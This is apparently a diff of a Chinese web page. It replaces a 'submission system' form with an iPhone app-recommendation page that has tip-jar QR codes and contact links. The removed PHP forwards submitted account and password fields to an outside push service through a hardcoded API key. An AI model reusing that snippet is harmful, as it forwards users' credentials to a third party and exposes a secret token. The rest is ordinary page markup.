@@ -1,54 +1,200 @@
 
-  <meta name="viewport" content="width=device-width, initial-scale=0.88, maximum-scale=1, user-scalable=no">
-        <meta http-equiv="X-UA-Compatible" content="IE=Edge">
-        <meta charset="UTF-8">
-        <meta name="keywords" content="By吹牛逼">
-        <meta name="description" content="吹牛逼">
-        <!-- Bootstrap -->
-        <link rel="shortcut icon" href="//static.hdslb.com/images/favicon.ico">
-        <link rel="stylesheet" href="//cdn.bootcss.com/bootstrap/3.3.0/css/bootstrap.min.css">
-        <style>
-            body{font-family: "Microsoft YaHei" ! important;}
-            html{background:url(自定义背景图片) no-repeat center top;background-size:cover}body{padding-top:20px;font-size:1pc;background:transparent}h1{font-weight:400;font-size:40px}.panel{background-color:hsla(0,0%,100%,.9)}.margin-base-vertical{margin:40px 0}.margin-base-mini{margin:20px 0}.bs-callout{padding:20px;margin:20px 0;border:1px solid #eee;border-left-width:5px;border-radius:3px}.bs-callout h4{margin-top:0;margin-bottom:5px}.bs-callout p:last-child{margin-bottom:0}.bs-callout code{border-radius:3px}.bs-callout+.bs-callout{margin-top:-5px}.bs-callout-danger{border-left-color:#d9534f}.bs-callout-danger h4{color:#d9534f}.bs-callout-warning{border-left-color:#f0ad4e}.bs-callout-warning h4{color:#f0ad4e}.bs-callout-info{border-left-color:#5bc0de}.bs-callout-info h4{color:#5bc0de}.tile-footer{padding:5px 10px;background:rgba(0,0,0,.1);text-align:left}.tile-content-wrapper{position:relative;overflow:hidden;padding:10px 10px 17px}.tile-content{font-size:35px}.tile-content span{font-size:18px;font-weight:700}.tile-content span,.tile-content-wrapper small{opacity:.7;-moz-opacity:.7;filter:alpha(opacity:70)}.tile-content-wrapper small{display:block;text-align:right;font-size:14px}.tile-header{padding:10px;background:#84b8ff;text-transform:uppercase;font-size:18px}.niebu{padding:10px}
-input{margin-top: 3px;}
-                </style>
+<html>
+<head>
+<meta charset="utf-8"> 
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+<style>
+
+body{width:auto;text-align:center;margin:0 auto;
+padding:0 10px 0 10px;
+max-width:750px; min-width:350px; boder:1px solid #d87777;
+
+background:#d7e9f5 url(https://ae01.alicdn.com/kf/Ha21caa6885a9453c996ec91ef91dfed3T.png) no-repeat left top;
+  background-size:100%;
+
+}
+
+.active {
+    background-color: #191dea;
+}
+.text_line
+{
+	clear:both;
+	margin-bottom:0px;
+}
+
+body{ text-align:center} 
+
+p1 {border-style:solid;}
+
+p1.outset {border-bottom-style:outset;}
+div.ex
+{
+background-color: #f4ea00;
+width:auto;
+padding:5px;
+border:5px solid gray;
+margin:0px;
+}
+div.fe
+{
+	float:left;
+	width:20%;
+	height:50px;
+padding-top:5px;
+text-align:center;
+}
+div.fd
+{
+	float:left;
+	width:320px;
+	height:100px;
+	margin:5px;
+border: width solid 1px;
+border-radius: 10px;
+   padding-left:10px;
+padding-top:17px;
+overflow:hidden;
+}
+
+p.o  {text-align: center;}
+p.db {margin:0 0; text-align: right; color:#ffffff; font-size:105%;}
+p.da {margin:0 0; text-align: center; color:#ffffff; font-size:145%;}
+p.d {margin:0 0; text-align: justify; color:#ffffff; font-size:185%; float:left;}
+p.b { margin:5 7;text-align: justify; color:#ffffff; font-size:125%; float:left;}
+p.date {border: 1px solid #;
+overflow: hidden;
+display: -webkit-box;
+-webkit-line-clamp: 2;
+-webkit-box-orient: vertical;
+color:#ffffff;
+text-align: justify; 
+}
+h3  {text-align: center; color:#ffffff; font-size:20px;}
+h2  {text-align: center; color: #000000; font-size:20px;}
+p.cc  {text-align: center; color:#ffffff; font-size:14px;}
+p.c  {text-align: center; color:#000000; font-size:14px;}
+a {
+color: #0508b9;
+text-decoration: none;
+}
+a:active {
+text-decoration: none;
+color: #001997;
+}
+
+a:link {text-decoration:none;}
+a:visited {text-decoration:none;}
+a:hover {text-decoration:none;}
+a:active {text-decoration:none;}
+
+a:link {color: #939292;}      /* 未访问链接*/
+a:visited {color: #939292}  /* 已访问链接 */
+a:hover {color: #adf2ed;}  /* 鼠标移动到链接上 */
+a:active {color: #adf2ed;}  /* 鼠标点击时 */
+
+#wrap {display:block;bottom:0px;right:1px!important;right:18px;width:100%;line-height:30px;position:fixed;border:1px solid #fff;text-align:center;color:#fff;  background-color:#fff;}
+*html{overflow-x:auto;overflow-y:auto;} 
+* html #wrap {position:absolute;}
+a:link {text-decoration:none;}
+a:visited {text-decoration:none;}
+a:hover {text-decoration:none;}
+a:active {text-decoration:none;}
+
+	
+</style>
 </head>
 <body>
-        <div class="container">
-                <div class="row">
-          
-            <div class="col-md-6 col-md-offset-3 panel panel-default">
-                        <h2 class="text-center">提交系统</h2>
-                        <div class="bs-callout bs-callout-info">
-                                                <h4 class="help-block text-left">Title</h4>
-                                </div>
-                                <form action="" method="post">
-<span class="label label-info">信息: </span><input type="text" name="text" placeholder="输入信息" class="form-control">
+<link rel="stylesheet" type="text/css" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.css" />
 
-<br>
 
-<input type="submit" value="发送" class="btn btn-sm btn-success">
-                  <br>
-                  用户反馈
-</form>
-        <?php
+<script src="https://muzikeji.cn/tctip-1.0.0.min.js"></script>
+  <script> 
+  new tctip({
+    top: '15%',
+    button: {
+      id: 4,
+      type: 'dashang',
+    },
+    list: [
+      {
+        type: 'alipay',
+        qrImg: 'https://ae01.alicdn.com/kf/Hc2599b7b8e14475491f70eaf847f96d1D.jpeg'
+      }, {
+        type: 'wechat',
+        qrImg: 'https://ae01.alicdn.com/kf/Hddce11218f244c75ad18b34d66a8acffu.jpeg'
+      }, {
+        type: 'wxq',
+        qrImg: 'https://ae01.alicdn.com/kf/H6031cd82fa0249289913bb0e2a1b0fde1.jpeg'
+      }, {
+        type: 'QQq',
+        qrImg: 'https://ae01.alicdn.com/kf/Heff31b5b438d43459809a7affe4bda640.jpeg'
+      }
+    ]
+  }).init()
+  </script>
 
-$text="订单信息：".$_POST["text"];
-$desp="用户信息…账号：".$_POST["user"]."密码：".$_POST["pass"];
-file_get_contents("https://sc.ftqq.com/SCU57030T1379dae0a25edc121f49d48b4db3ef555d4a53f0cb633.send?text={$text}&desp={$desp}");
-?>
-<span style="color: purple;">
-<?php
-if($_POST)
-{
-echo "提示：".$text."更新成功！请勿重复提交";
+<script>
+if(('standalone' in window.navigator)&&window.navigator.standalone){
+        var noddy,remotes=false;
+        document.addEventListener('click',function(event){
+                noddy=event.target;
+                while(noddy.nodeName!=='A'&&noddy.nodeName!=='HTML') noddy=noddy.parentNode;
+                if('href' in noddy&&noddy.href.indexOf('http')!==-1&&(noddy.href.indexOf(document.location.host)!==-1||remotes)){
+                        event.preventDefault();
+                        document.location.href=noddy.href;
+                }
+        },false);
 }
-?></span>
-                        </div>
-                        <div class="col-md-3"> <!-- 评论代码放置区 -->        
-                        </div>
-                </div><!-- //row -->
-        </div> <!-- //container -->
-
+</script>
 </body>
-</html>
+
+<a href="https://jiejinghe.com/users/6563404841">
+<img  border="0" src="https://ae01.alicdn.com/kf/He2dada90d0bc4249b1805e31fe631a93V.jpeg" alt="木子李" width="100%" height="auto"></a>
+<h3>iphone应用推荐</h3>
+<a href="http://i.yjgld.com/dahuicxs.html" target="_blank"><div  class="fd" style="background-color: #afedaa"><p class="d"> <img src="https://ae01.alicdn.com/kf/H1de38b030b1d4a31b0060c2cd2becd42T.png" alt="Google Chrome" width="32" height="32"> </p><p class="da" style=" font-size:25px;"> <b>微信分身版</b>　</p> <p class="date"><b>描述：可与原微信共存，微商必备神器！<b></p>
+</div></a>
+<h2 class="text_line"> </h2>
+<div class="ex">
+<h2>【温馨提示】</h2>
+<h2><a href="mailto:56794501@qq.com">&nbsp;商务合作</a>|<a href="https://jiejinghe.com/" target="_blank">捷径盒</a> </h2>
+<p>如果本站内容存在侵权，请提供相关专利证书<a href="mailto:56794501@qq.com">致信给我们</a>或者<a target="_blank" href="http://wpa.qq.com/msgrd?v=3&uin=56794501&site=qq&menu=yes"><img border="0" src="http://wpa.qq.com/pa?p=2:56794501:51" alt="联系客服💁🏻‍♂️" title="联系客服💁🏻‍♂️"/></a>我们将在5个工作日之内进行处理，若未致信我们将视为默认授权，我们将不承担任何法律责任.</p>
+</div>
+<h5 class="text_line"> </h5>
+<a class="a1" href="/评论.html"><p class="o"> 说说你对本站的看法或建议？💁🏻‍♂️</p></a>
+<div  class="tp"> <a href="/评论.html">
+<img  border="0" src="https://ae01.alicdn.com/kf/Hc2f11f65cbf4471bbe3c51eb836718f4P.jpeg" alt="快捷指令" width="100%" height="auto"></a></div>
+<p class="text_line"> </p>
+
+<p class="text_line"> </p>
+
+<p class="c">感谢访问本站好用记得收藏</p>
+<div  class="sm" style="background-color: #7fc4e5"><p class="c">
+木子科技唯一官方网站</p></div>
+<p class="c">版权所有©️木子科技(2019-2028)</p>
+ <div style='height:30px; line-height:30px; text-align:center; color: #b2b2b2;'>
+    <a href="http://wpa.qq.com/msgrd?v=3&uin=56794501&site=qq&menu=yes/">
+ 
+        <img style="position:fixed;right:0; bottom:160px; z-index:99999; width:35px !
+important;height:35px !important;" src="https://ae01.alicdn.com/kf/H68a96fef252642fda2b3039af6819ed5a.png" />
+ 
+    <a style="z-index:99999;" id="goTop" href="#">
+ 
+         <img style="position:fixed;right:0; bottom:100px; z-index:99999; width:35px !
+important;height:35px!important;" src="https://ae01.alicdn.com/kf/H6b0917bee3a445eaa0678320578f0e39s.png" />
+   <a href="https://muzikeji.cn/">
+ 
+        <img style="position:fixed;right:0; bottom:220px; z-index:99999; width:35px !
+important;height:35px !important;" src="https://ae01.alicdn.com/kf/H3aa837761ac143c8899f338e84b7ae071.png" />
+<div style="height:100px;"></div>
+<div id="wrap"> 
+<a class="a2"  href="https://muzikeji.cn/"><div  class="fe" style="background-color: #d4d1d0; line-height:2px" > <i class="fa fa-th-large fa-lg"></i><br><p class="o" >主页</p></div></a>
+<a class="a2"  href="/JJ.html"><div  class="fe" style="background-color: #d4d1d0; line-height:2px" > <i class="fa fa-clone fa-lg"></i><br><p class="o" >捷径</p></div></a>
+<a class="a2"  href="/yy.html"><div  class="fe" style="background-color: #d4d1d0; line-height:2px" > <i class="fa fa-briefcase fa-lg"></i><br><p class="o" >应用</p></div></a>
+<a class="a2"  href="/guanyu.html"><div  class="fe" style="background-color: #d4d1d0; line-height:2px" > <i class="fa fa-info fa-lg"></i><br><p class="o" >关于</p></div></a>
+<a class="a2"  href="/LX.html"><div  class="fe" style="background-color: #d4d1d0; line-height:2px" > <i class="fa fa-qq fa-lg"></i><br><p class="o" >联系</p></div></a>
+</div
